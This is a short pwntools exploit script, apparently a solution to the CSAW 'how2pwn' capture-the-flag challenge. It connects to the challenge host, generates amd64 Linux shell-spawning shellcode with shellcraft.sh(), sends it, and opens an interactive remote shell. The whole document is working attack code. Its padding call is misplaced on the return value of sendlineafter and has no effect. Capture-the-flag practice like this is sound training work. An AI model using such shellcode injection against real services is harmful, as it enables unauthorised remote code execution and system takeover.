from pwn import *

context.log_level='debug'
#p = process("./chal1")

p = remote("how2pwn.chal.csaw.io", 60001)
context.os = 'linux'
context.arch = 'amd64'

sc = shellcraft.sh()

p.sendlineafter(": \n",asm(sc)).ljust(0x100,b'\0')

p.interactive()